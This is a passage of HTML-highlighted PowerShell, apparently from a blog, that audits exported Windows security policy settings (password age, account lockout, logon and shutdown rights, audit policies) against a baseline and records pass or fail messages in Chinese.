class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;MaximumPasswordAge &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-le</span> <span class="string">&quot;90&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码最长使用期限策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;密码最长使用期限策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">#账户锁定阀值策略</span></span><br><span class="line">  </span><br><span class="line">   <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;LockoutBadCount &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-le</span> <span class="string">&quot;5&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;账户锁定阀值策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;账户锁定阀值策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="comment">#重置账户锁定策略</span></span><br><span class="line">  </span><br><span class="line">   <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;ResetLockoutCount &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-ge</span> <span class="string">&quot;10&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;重置账户锁定策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;重置账户锁定策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">#操作系统本地关机策略安全</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;SeShutdownPrivilege &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;*S-1-5-32-544&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;操作系统本地关机策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;操作系统本地关机策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#操作系统远程关机策略安全</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;SeRemoteShutdownPrivilege &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;*S-1-5-32-544&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;操作系统远程关机策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;操作系统远程关机策略不符合标准&quot;</span>;</span><br><span class="line">                             &#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#取得文件或其他对象的所有权限策略</span></span><br><span class="line">  <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;SeProfileSingleProcessPrivilege &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;*S-1-5-32-544&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;取得文件或其他对象的所有权限策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;取得文件或其他对象的所有权限策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">#从本地登录此计算机策略</span></span><br><span class="line">  <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;SeInteractiveLogonRight &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;从本地登录此计算机策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;从本地登录此计算机策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#从网络访问此计算机策略</span></span><br><span class="line">  <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;SeNetworkLogonRight &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;*S-1-5-32-544,*S-1-5-32-545,*S-1-5-32-551&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;从网络访问此计算机策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;从网络访问此计算机策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">#审核策略更改</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditSystemEvents &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核策略更改策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核策略更改策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#审核登录事件</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditLogonEvents &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核登录事件策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核登录事件不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">#审核对象访问</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditObjectAccess &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核对象访问策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核对象访问不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#审核进程跟踪</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditProcessTracking &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核进程跟踪策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核进程跟踪策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">#审核目录服务访问</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditDSAccess &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核目录服务访问策略符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>.code = <span class="string">&quot;0&quot;</span></span><br><span class="line">            <span class="variable">$projectdata</span> = <span class="selector-tag">@</span>&#123;<span class="string">&quot;msg&quot;</span>=<span class="string">&quot;审核目录服务访问策略不符合标准&quot;</span>;&#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;project&#x27;</span>]+=<span class="variable">$projectdata</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#审核特权使用</span></span><br><span class="line"> <span class="variable">$config</span> = <span class="built_in">Get-Content</span> <span class="literal">-path</span> config.cfg</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$config</span>.Length; <span class="variable">$i</span>++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="variable">$config_line</span> = <span class="variable">$config</span>[<span class="variable">$i</span>] <span class="operator">-split</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$config_line</span>[<span class="number">0</span>] <span class="operator">-eq</span> <span class="string">&quot;AuditPrivilegeUse &quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$config_line</span>[<span class="number">1</span>] = <span class="variable">$config_line</span>[<span class="number">1</span>].Trim(<span class="string">&quot; `&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$config_line</span>[<span class="number">1</span>] <span class="operator">-eq</span> <span class="string">&quot;3&quot;</span>)</span><br><span 